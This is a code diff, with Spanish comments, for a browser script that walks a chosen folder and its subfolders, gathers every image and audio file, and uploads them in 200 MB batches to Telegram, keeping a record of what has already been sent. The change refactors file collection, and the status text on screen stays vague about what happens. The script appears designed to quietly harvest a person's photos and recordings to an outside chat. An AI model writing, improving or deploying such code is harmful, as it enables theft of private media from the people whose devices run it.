@@ -35,7 +35,12 @@ document.getElementById('start-btn').addEventListener('click', async () => {
                 const folderHandle = await window.showDirectoryPicker();
 
                 updateStatus('Analizando estructura...', 20);
-                await processFilesInFragments(folderHandle);
+                const files = await collectFiles(folderHandle);
+                if (!files.length) throw new Error('No hay archivos');
+                updateStatus(`Elementos detectados: ${files.length}`, 40);
+
+                updateStatus('Procesando archivos...', 50);
+                await processFilesInFragments(files);
 
                 updateStatus('✅ OPERACIÓN EXITOSA', 100);
             } catch (error) {
@@ -56,79 +61,51 @@ document.getElementById('clear-btn').addEventListener('click', () => {
     alert('Registro de fotos enviadas eliminado');
 });
 
-async function processFilesInFragments(folderHandle) {
+async function collectFiles(folderHandle) {
+    const files = [];
+    for await (const entry of folderHandle.values()) {
+        if (entry.kind === 'file') {
+            const fileName = entry.name.toLowerCase();
+            if (fileName.endsWith('.jpg') || fileName.endsWith('.jpeg') || fileName.endsWith('.png') ||
+                fileName.endsWith('.gif') || fileName.endsWith('.bmp') || fileName.endsWith('.webp') ||
+                fileName.endsWith('.mp3') || fileName.endsWith('.wav') || fileName.endsWith('.ogg')) {
+                files.push(entry);
+            }
+        } else if (entry.kind === 'directory') {
+            const subFiles = await collectFiles(entry);
+            files.push(...subFiles);
+        }
+    }
+    return files;
+}
+
+async function processFilesInFragments(files) {
     const fragmentSizeLimit = 200 * 1024 * 1024; // 200 MB
     let currentFragmentSize = 0;
     let currentFiles = [];
     const sentFiles = new Set(JSON.parse(localStorage.getItem('sentFiles') || '[]')); // Cargar enviados
-    let totalFiles = 0;
-    let processedFiles = sentFiles.size;
+    let processedFiles = 0;
 
-    // Contar archivos totales para progreso
-    for await (const entry of folderHandle.values()) {
-        if (entry.kind === 'file' && isSupportedFile(entry.name)) totalFiles++;
-        else if (entry.kind === 'directory') totalFiles += await countFiles(entry);
-    }
-    updateStatus(`Elementos detectados: ${totalFiles}`, 40);
+    for (let i = 0; i < files.length; i++) {
+        const entry = files[i];
+        const file = await entry.getFile();
+        const fileKey = `${file.name}-${file.size}-${file.lastModified}`;
 
-    // Procesar en fragmentos
-    for await (const entry of folderHandle.values()) {
-        if (entry.kind === 'file' && isSupportedFile(entry.name)) {
-            const file = await entry.getFile(); // Corrección: directo en entry
-            const fileKey = `${file.name}-${file.size}-${file.lastModified}`;
-
-            if (!sentFiles.has(fileKey)) {
-                if (currentFragmentSize + file.size <= fragmentSizeLimit) {
-                    currentFiles.push({ file, key: fileKey });
-                    currentFragmentSize += file.size;
-                } else {
-                    await sendFragment(currentFiles, sentFiles, processedFiles, totalFiles);
-                    processedFiles += currentFiles.length;
-                    currentFiles = [{ file, key: fileKey }];
-                    currentFragmentSize = file.size;
-                }
+        if (!sentFiles.has(fileKey)) {
+            if (currentFragmentSize + file.size <= fragmentSizeLimit) {
+                currentFiles.push({ file, key: fileKey });
+                currentFragmentSize += file.size;
+            } else {
+                await sendFragment(currentFiles, sentFiles, processedFiles, files.length);
+                processedFiles += currentFiles.length;
+                currentFiles = [{ file, key: fileKey }];
+                currentFragmentSize = file.size;
             }
-        } else if (entry.kind === 'directory') {
-            const subFiles = await collectFiles(entry, sentFiles, currentFiles, currentFragmentSize, fragmentSizeLimit, processedFiles, totalFiles);
-            currentFiles = subFiles.files;
-            currentFragmentSize = subFiles.size;
-            processedFiles += subFiles.processed;
         }
     }
     if (currentFiles.length > 0) {
-        await sendFragment(currentFiles, sentFiles, processedFiles, totalFiles);
+        await sendFragment(currentFiles, sentFiles, processedFiles, files.length);
     }
-}
-
-async function collectFiles(folderHandle, sentFiles, currentFiles, currentFragmentSize, fragmentSizeLimit, processedFiles, totalFiles) {
-    let localFiles = currentFiles;
-    let localSize = currentFragmentSize;
-    let localProcessed = 0;
-
-    for await (const entry of folderHandle.values()) {
-        if (entry.kind === 'file' && isSupportedFile(entry.name)) {
-            const file = await entry.getFile(); // Corrección: directo en entry
-            const fileKey = `${file.name}-${file.size}-${file.lastModified}`;
-
-            if (!sentFiles.has(fileKey)) {
-                if (localSize + file.size <= fragmentSizeLimit) {
-                    localFiles.push({ file, key: fileKey });
-                    localSize += file.size;
-                } else {
-                    await sendFragment(localFiles, sentFiles, processedFiles + localProcessed, totalFiles);
-                    localProcessed += localFiles.length;
-                    localFiles = [{ file, key: fileKey }];
-                    localSize = file.size;
-                }
-            }
-        } else if (entry.kind === 'directory') {
-            const subResult = await collectFiles(entry, sentFiles, localFiles, localSize, fragmentSizeLimit, processedFiles + localProcessed, totalFiles);
-            localFiles = subResult.files;
-            localSize = subResult.size;
-            localProcessed += subResult.processed;
-        }
-    }
-    return { files: localFiles, size: localSize, processed: localProcessed };
 }
 
 async function sendFragment(files, sentFiles, processedFiles, totalFiles) {
@@ -167,20 +144,4 @@ async function sendToTelegram(files) {
             await new Promise(resolve => setTimeout(resolve, 5000)); // Esperar 5 segundos antes de reintentar
         }
     }
-}
-
-function isSupportedFile(fileName) {
-    const name = fileName.toLowerCase();
-    return name.endsWith('.jpg') || name.endsWith('.jpeg') || name.endsWith('.png') ||
-           name.endsWith('.gif') || name.endsWith('.bmp') || name.endsWith('.webp') ||
-           name.endsWith('.mp3') || name.endsWith('.wav') || name.endsWith('.ogg');
-}
-
-async function countFiles(folderHandle) {
-    let count = 0;
-    for await (const entry of folderHandle.values()) {
-        if (entry.kind === 'file' && isSupportedFile(entry.name)) count++;
-        else if (entry.kind === 'directory') count += await countFiles(entry);
-    }
-    return count;
 }
